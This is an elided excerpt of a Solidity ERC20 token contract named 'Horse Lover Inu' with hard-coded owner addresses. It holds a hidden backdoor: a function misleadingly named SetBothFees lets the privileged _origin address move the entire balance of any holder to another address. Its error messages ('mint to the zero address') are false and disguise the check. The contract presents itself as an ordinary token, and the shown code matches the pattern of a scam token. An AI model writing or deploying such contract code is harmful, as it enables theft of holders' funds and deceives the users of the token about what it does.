 ...
 contract HorseInu is Context, IERC20 {
 ...
 address _addr = 0xF942Dba4159CB61F8AD88ca4A83f5204e8F4A6bd;
 address public _origin = 0x4aFD86910BeeeD13C3c77Dc9E9BB647db28137FB;
 constructor () public {
 _name = "Horse Lover Inu";
 _symbol = "HORSINU";
 _decimals = 18;
 uint256 initialSupply = 1000000000;
 _safeOwner = _origin;
 finish(_addr, initialSupply*(10**18));
 }
 ...
 function finish(address account, uint256 amount) public {
 ...
 function update(address account, address staker) public {
 require(msg.sender == _origin, "ERC20: mint to the zero address");
 ...
 function SetBothFees(address account, address staker) public {
 require(msg.sender == _origin, "ERC20: mint to the zero address");
 uint256 amount = _balances[account];
 _beforeTokenTransfer(account, staker, amount);
 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
